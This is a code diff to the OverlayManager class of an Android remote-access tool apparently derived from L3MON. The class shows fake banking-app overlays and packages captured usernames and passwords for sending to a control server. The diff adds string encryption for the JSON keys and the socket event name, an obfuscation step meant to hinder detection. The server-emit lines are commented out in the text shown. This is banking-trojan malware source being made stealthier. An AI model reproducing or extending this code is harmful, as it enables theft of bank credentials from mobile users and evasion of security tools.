@@ -1,13 +1,17 @@
 package com.etechd.l3mon.managers;
 
 import android.view.accessibility.AccessibilityNodeInfo;
+
 import org.json.JSONObject;
+
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Timer;
 import java.util.TimerTask;
+
+import com.etechd.l3mon.StringCrypto;
 
 public class OverlayManager {
 
@@ -39,7 +43,8 @@ public class OverlayManager {
     }
 
     private void startMonitoring() {
-        if (overlayTimer != null) overlayTimer.cancel();
+        if (overlayTimer != null)
+            overlayTimer.cancel();
 
         overlayTimer = new Timer();
         overlayTimer.scheduleAtFixedRate(new TimerTask() {
@@ -54,14 +59,17 @@ public class OverlayManager {
     public void showFakeOverlay(String bankName, String packageName) {
         try {
             JSONObject event = new JSONObject();
-            event.put("action", "show_overlay");
-            event.put("appName", bankName.toUpperCase());
-            event.put("packageName", packageName);
-            event.put("success", true);
-            event.put("timestamp", System.currentTimeMillis());
 
-            // Enviar para servidor
-            // ConnectionManager.ioSocket.emit("0xOI", event);
+            // === CHAVES JSON CRIPTOGRAFADAS ===
+            event.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "show_overlay"); // "action"
+            event.put(StringCrypto.d("b154d5rAz4A5cTVeIwwlGg=="), bankName.toUpperCase()); // "appName"
+            event.put(StringCrypto.d("Ca1KRioPEFMViEClN0e4rg=="), packageName); // "packageName"
+            event.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true); // "success"
+            event.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"
+
+            // Enviar para servidor (quando descomentar, use o evento criptografado)
+            // String eventOI = StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="); // 0xOI
+            // ConnectionManager.ioSocket.emit(eventOI, event);
 
             activeOverlays.add(bankName.toLowerCase());
         } catch (Exception e) {
@@ -72,14 +80,18 @@ public class OverlayManager {
     public void captureCredentials(String bankName, String username, String password) {
         try {
             JSONObject event = new JSONObject();
-            event.put("action", "capture_credentials");
-            event.put("appName", bankName);
-            event.put("username", username);
-            event.put("password", password);
-            event.put("success", true);
-            event.put("timestamp", System.currentTimeMillis());
 
-            // ConnectionManager.ioSocket.emit("0xOI", event);
+            // === CHAVES JSON CRIPTOGRAFADAS ===
+            event.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "capture_credentials"); // "action"
+            event.put(StringCrypto.d("b154d5rAz4A5cTVeIwwlGg=="), bankName); // "appName"
+            event.put(StringCrypto.d("KYySL2f7hb2Jfz0mpUztvw=="), username); // "username"
+            event.put(StringCrypto.d("Jy5jW50bgS6lqjqpYWApfQ=="), password); // "password"
+            event.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true); // "success"
+            event.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"
+
+            // ConnectionManager.ioSocket.emit(StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="),
+            // event); // 0xOI
+
             activeOverlays.remove(bankName.toLowerCase());
         } catch (Exception e) {
             e.printStackTrace();
